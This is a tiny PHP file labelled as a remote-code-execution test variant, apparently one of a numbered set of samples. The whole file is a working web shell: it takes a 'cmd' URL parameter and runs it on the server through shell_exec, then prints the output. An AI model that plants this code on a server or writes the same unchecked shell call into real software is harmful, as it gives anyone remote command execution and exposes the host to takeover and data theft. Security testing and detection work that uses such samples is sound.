<?php
// RCE test variation #982
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>